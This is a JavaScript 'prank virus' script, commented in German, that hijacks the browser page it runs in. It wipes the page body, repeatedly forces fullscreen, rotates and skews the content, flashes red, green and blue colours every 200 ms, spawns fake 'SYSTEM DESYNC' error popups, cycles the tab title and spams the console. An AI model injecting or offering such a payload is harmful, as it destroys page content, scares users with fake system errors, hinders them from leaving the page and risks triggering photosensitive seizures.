(async function(){
  if(window.__prankVirus3) return;
  window.__prankVirus3 = true;

  // Vollbild erzwingen
  async function enableFullscreen(){
    try { if(!document.fullscreenElement) await document.documentElement.requestFullscreen(); } catch(e){}
  }
  setInterval(enableFullscreen,500);
  await enableFullscreen();

  // Original-Content sichern und in Container packen
  const wrapper = document.createElement("div");
  wrapper.style.position = "fixed";
  wrapper.style.top = "0";
  wrapper.style.left = "0";
  wrapper.style.width = "100vw";
  wrapper.style.height = "100vh";
  wrapper.style.background = "black";
  wrapper.style.display = "flex";
  wrapper.style.alignItems = "center";
  wrapper.style.justifyContent = "center";
  wrapper.style.overflow = "hidden";
  wrapper.style.zIndex = "999999";
  wrapper.innerHTML = "<div id='mirrorContent' style='width:100%;height:100%;background:white;display:flex;align-items:center;justify-content:center;font-family:monospace;font-size:30px;'>MIRROR MADNESS</div>";
  document.body.innerHTML = "";
  document.body.appendChild(wrapper);

  const content = document.getElementById("mirrorContent");

  // Zufällige Transformationen
  function randomTransform(){
    const rotate = (Math.random()*360-180).toFixed(2);
    const scale = (Math.random()*1.5+0.5).toFixed(2);
    const skewX = (Math.random()*40-20).toFixed(1);
    const skewY = (Math.random()*40-20).toFixed(1);
    content.style.transform = `rotate(${rotate}deg) scale(${scale}) skew(${skewX}deg,${skewY}deg)`;
  }
  setInterval(randomTransform, 300);

  // Farbblitze
  function flash(){
    content.style.backgroundColor = ["#fff","#ff0000","#00ff00","#0000ff"][Math.floor(Math.random()*4)];
    setTimeout(()=>content.style.backgroundColor="white", 100);
  }
  setInterval(flash, 200);

  // Popup-Meldungen
  function spawnPopup(){
    const popup = document.createElement("div");
    popup.style.position = "absolute";
    popup.style.left = Math.random()*window.innerWidth+"px";
    popup.style.top = Math.random()*window.innerHeight+"px";
    popup.style.color = ["red","lime","cyan","yellow"][Math.floor(Math.random()*4)];
    popup.style.fontSize = "20px";
    popup.style.fontFamily = "monospace";
    popup.innerText = "!!! SYSTEM DESYNC !!!";
    wrapper.appendChild(popup);
    setTimeout(()=>popup.remove(), 1500);
  }
  setInterval(spawnPopup, 250);

  // Titel ständig ändern
  setInterval(()=>{
    document.title = ["MIRROR_ERR","DESYNC","ROTATE_FAIL","WARPING","##ERR##"]
      [Math.floor(Math.random()*5)];
  },500);

  // Console zuspammen
  setInterval(()=>{
    console.error("Desync at matrix["+Math.floor(Math.random()*999)+"]");
    console.warn("Warp core unstable!");
    console.log("Transform seed:", Math.random().toString(36).slice(2,8));
  },100);
})();
